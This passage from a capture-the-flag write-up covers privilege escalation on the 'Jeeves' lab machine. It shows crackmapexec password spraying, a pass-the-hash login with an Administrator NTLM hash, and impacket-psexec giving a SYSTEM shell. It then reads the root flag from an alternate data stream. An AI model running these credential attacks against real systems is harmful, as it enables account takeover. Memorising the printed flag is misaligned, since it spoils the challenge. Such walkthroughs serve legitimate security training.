With the password retrieved and the hash we try crackmapexec

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ crackmapexec smb 10.10.10.63 -u Administrator -p passwords                                                        
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE 
                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

And we can get access with the hash

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ /usr/bin/impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file mmOvtJnn.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service JCqX on 10.10.10.63.....
[*] Starting service JCqX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]

(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

And we are nt authority\system

We have trouble opening the root flag, because in the Administrator\Desktop folder we found a file named hm.txt. On thing to check in CTFs is for alternative data streams, which can be seen in `dir` with `/R`

```shell
C:\Users\Administrator\Desktop> dir                                 
12/24/2017  03:51 AM                36 hm.txt         
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk  

C:\Users\Administrator\Desktop> type hm.txt      
The flag is elsewhere.  Look deeper.                                                        
C:\Users\Administrator\Desktop> dir /R  
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA

C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```